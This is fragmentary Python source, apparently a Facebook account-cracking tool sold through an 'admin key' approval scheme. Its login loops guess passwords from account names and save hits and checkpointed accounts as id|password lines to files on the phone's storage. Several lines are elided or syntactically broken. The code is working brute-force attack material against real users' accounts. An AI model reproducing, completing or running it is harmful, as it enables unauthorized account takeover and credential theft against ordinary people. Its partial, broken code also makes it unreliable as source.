#omi(SAT SHAHIN YT)(SHAHI. ALAM) 
 ...
   id = "→".join(uuid) 
   server = requests.get(f'{tan}://{iya}.com/{ani}122/vip/blob/omi/a.txt').text 
    
   
...
|  $$$$$$/| $$ | $$ | $$| $$
 ...
   print(f"") 
   print(f"\x1b[1;92m   contract Admin to Buy this Tools                                                               ");omi ) 
   print(f"") 
   print(f"\033[1;32     YOUR  KEY : "+id) 
   print(f"") 
   print(f"\033[1;31m   COPY YOUR KEY AND SEND TO ADMIN  ");omi) 
   print(f"") 
   print(f"  Follow Admin Facebook ID,,,,,,,,,,,,,,,,,    Omi) 
   os.system(f'xdg-open {tan}://https://www.facebook.com/kabsundisb') 
   print(f"");time.sleep(2) 
   print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");omi(0.5) 
   try: 
     httpCaht = requests.get(f"{tan}://{iya}.com/{ani}122/vip/blob/omi/a.txt").text 
     if id in httpCaht: 
       print(f"\033[1;92m   YOUR KEY APROVED  ");omi (2) 
       msg = str(os.geteuid()) 
       time.sleep(0.5) 
       pass 
     else: 
...
|  $$$$$$/| $$ | $$ | $$| $$
 ...
         server = requests.get(f'{tan}://{iya}.com/{ani}122/vip/blob/omi/a.txt').text 
         try: 
                 httpCaht = requests.get(f"{tan}://{iya}.com/{ani}122/vip/blob/omi/b.txt").text 
                 if id in httpCaht: 
                         msg = str(os.geteuid()) 
                         pass 
                 else: 
 ...
         global loop,oks,cps 
         sys.stdout.write(f'\r\r\033[1;37m [omi1x1-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush() 
 ...
                                 print(f'\r\r\033[1;32m [omi-OK] %s | %s'%(ids,pas)) 
                                 open(f'/sdcard/omi-OK.txt', 'a').write(ids+'|'+pas+'\n') 
                                 #cek_apk(session,coki) 
                                 oks.append(ids) 
                                 break 
                         elif 'checkpoint' in Shahin: 
                                 if 'y' in pcp: 
                                         print(f'\r\r\x1b[38;5;126m [omi-CP] '+ids+' | '+pas+'\033[1;97m') 
                                         open(f'/sdcard/omi-CP.txt', 'a').write(ids+'|'+pas+'\n') 
                                         cps.append(ids) 
                                         break 
                                 else: 
                                         break 
 ...
         global loop,oks,cps 
         sys.stdout.write(f'\r\r\033[1;37m [omi1x1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush() 
         session = requests.Session() 
         try: 
                 first = names.split(f' ')[0] 
                 try: 
 ...
                                 q = json.loads(po) 
                                 if 'session_key' in q: 
                                         print(f'\r\r\033[1;32m [omi-OK] '+ids+' | '+pas+'\033[1;97m') 
                                         open(f'/sdcard/omi-OK.txt','a').write(ids+'|'+pas+'\n') 
                                         #cek_apk(session,coki) 
                                         oks.append(ids) 
                                         break 
 ...
                                 cid = coki[151:166] 
                                 print('\n') 
                                 print('\033[1;92m[omi-OK] '+idf+' | '+ps+'\033[0;97m') 
                                 cek_apk(coki) 
 ...
                                 cid = coki[141:156] 
                                 print('\n') 
                                 print('\033[1;91m[omi-CP] '+idf+' | '+ps+'\033[0;97m') 
